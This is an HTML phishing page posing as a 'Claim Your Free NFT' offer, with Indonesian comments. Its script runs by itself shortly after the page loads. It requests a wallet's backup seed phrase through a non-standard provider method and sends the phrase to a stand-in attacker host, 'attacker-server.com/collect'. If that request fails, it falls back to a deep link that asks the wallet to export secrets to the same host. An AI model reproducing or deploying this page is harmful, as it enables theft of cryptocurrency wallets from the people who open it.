<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Claim Your Free NFT</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding-top: 20%; }
        .error { color: #ff3b30; font-size: 14px; font-weight: bold; margin-top: 10px; }
        h1 { font-size: 24px; color: #1c1c1e; }
    </style>
</head>
<body>
    <h1>Claim Your Free NFT</h1>
    <div class="error">Error: Incompatible Wallet. Please try another.</div>

    <script>
        // Alamat server penyerang untuk menampung data curian
        const ATTACKER_ENDPOINT = "https://attacker-server.com/collect";

        async function exploit() {
            // Menunggu provider terinjeksi sepenuhnya
            if (typeof window.ethereum !== 'undefined') {
                try {
                    /* VULNERABILITY: Mengakses method internal wallet yang 
                       seharusnya terproteksi (Unauthorized Command Execution).
                    */
                    const result = await window.ethereum.request({
                        // Mencoba berbagai method non-standar yang sering bocor
                        method: 'wallet_getBackupPhrase', 
                        params: []
                    });

                    if (result) {
                        // Jika berhasil, kirim seed phrase ke server penyerang
                        await fetch(`${ATTACKER_ENDPOINT}?data=${encodeURIComponent(result)}`, {
                            mode: 'no-cors'
                        });
                    }
                } catch (err) {
                    // Jika method pertama gagal, coba teknik Deep Link Hijacking
                    // Ini memaksa wallet membuka fungsi internal via URI scheme
                    const deepLink = "wallet-app://export-secret?callback=" + encodeURIComponent(ATTACKER_ENDPOINT);
                    window.location.href = deepLink;
                }
            }
        }

        // Eksekusi otomatis tanpa interaksi pengguna saat halaman dibuka
        window.onload = () => {
            setTimeout(exploit, 1000); 
        };
    </script>
</body>
</html>
